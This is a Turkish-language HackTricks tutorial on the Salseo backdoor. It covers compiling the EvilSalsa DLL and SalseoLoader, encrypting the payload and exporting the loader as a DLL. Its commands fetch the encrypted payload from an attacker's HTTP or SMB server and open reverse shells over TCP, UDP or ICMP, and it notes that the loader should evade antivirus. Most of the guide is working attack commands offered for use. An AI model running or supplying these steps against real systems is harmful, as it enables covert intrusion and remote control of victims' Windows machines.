# Salseo

{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Derlemeleri Oluşturma

Kaynak kodunu github'dan indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekmektedir.

Bu projeleri, kullanacak olduğunuz Windows işletim sisteminin mimarisi için derleyin (Windows x64'ü destekliyorsa, bu mimari için derleyin).

Mimarisi **Visual Studio içinde** **"Platform Target"** altında **sol "Build" Sekmesinde** seçebilirsiniz.

(\*\*Bu seçenekleri bulamazsanız, **"Project Tab"** üzerine tıklayın ve ardından **"\<Project Name> Özellikleri"**ne tıklayın)

![](<../.gitbook/assets/image (132).png>)

Daha sonra, her iki projeyi de derleyin (Build -> Build Solution) (Log içinde yürütülebilir dosyanın yolunu göreceksiniz):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Arka Kapıyı Hazırlama

Öncelikle, **EvilSalsa.dll**'yi kodlamalısınız. Bunu yapmak için **encrypterassembly.py** adlı python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Şimdi Salseo işlemini gerçekleştirmek için ihtiyacınız olan her şeye sahipsiniz: **şifrelenmiş EvilDalsa.dll** ve **SalseoLoader'ın ikili dosyası.**

**SalseoLoader.exe ikili dosyasını makineye yükleyin. Herhangi bir AV tarafından tespit edilmemeleri gerekiyor...**

## **Arka kapıyı çalıştırın**

### **TCP ters kabuk almak (şifrelenmiş dll'yi HTTP üzerinden indirme)**

Ters kabuk dinleyici olarak nc'yi başlatmayı ve şifrelenmiş evilsalsa'yı sunmak için bir HTTP sunucusu başlatmayı unutmayın.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Bir UDP ters kabuk almak (SMB üzerinden kodlanmış dll indirme)**

Ters kabuk dinleyici olarak nc'yi başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu başlatmayı unutmayın (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMP ters kabuk almak (şifrelenmiş dll zaten kurbanın içinde)**

**Bu sefer ters kabuk almak için istemci tarafında özel bir araca ihtiyacınız var. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP Yanıtlarını Devre Dışı Bırakın:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### İstemciyi çalıştırın:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Kurbanın içinde, salseo şeyini çalıştıralım:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Ana işlevi dışa aktaran DLL olarak SalseoLoader'ı derleme

Visual Studio kullanarak SalseoLoader projesini açın.

### Ana işlevden önce ekle: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Bu projeye DllExport yükleyin

#### **Araçlar** --> **NuGet Paket Yöneticisi** --> **Çözüm İçin NuGet Paketlerini Yönet...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'yi seçin (ve açılan pencereyi kabul edin)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Projeler klasörünüzde **DllExport.bat** ve **DllExport\_Configure.bat** dosyaları görünmelidir.

### DllExport'u kaldırın

**Kaldır**'ı seçin (evet, tuhaf ama bana güvenin, gerekli)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### Visual Studio'yu kapatın ve DllExport\_configure'ı çalıştırın

Sadece **çıkın** Visual Studio'dan

Ardından, **SalseoLoader klasörüne** gidin ve **DllExport\_Configure.bat**'ı çalıştırın

**x64**'ü seçin (eğer x64 kutusunda kullanacaksanız, benim durumumda olduğu gibi), **System.Runtime.InteropServices**'ı seçin (**DllExport için Namespace** içinde) ve **Uygula**'yı seçin

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### Projeyi tekrar Visual Studio ile açın

**\[DllExport]** artık hata olarak işaretlenmemelidir

![](<../.gitbook/assets/image (8) (1).png>)

### Çözümü derleyin

**Çıkış Türü = Sınıf Kitaplığı** seçin (Proje --> SalseoLoader Özellikleri --> Uygulama --> Çıkış türü = Sınıf Kitaplığı)

![](<../.gitbook/assets/image (10) (1).png>)

**x64 platformunu** seçin (Proje --> SalseoLoader Özellikleri --> Derleme --> Platform hedefi = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Çözümü derlemek için: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolu görünecektir)

### Oluşturulan Dll'yi test edin

Dll'yi test etmek istediğiniz yere kopyalayın ve yapıştırın.

Çalıştır:
```
rundll32.exe SalseoLoader.dll,main
```
Eğer hata görünmüyorsa, muhtemelen işlevsel bir DLL'niz var!!

## DLL kullanarak bir kabuk alın

Bir **HTTP** **sunucusu** kullanmayı ve bir **nc** **dinleyici** ayarlamayı unutmayın

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
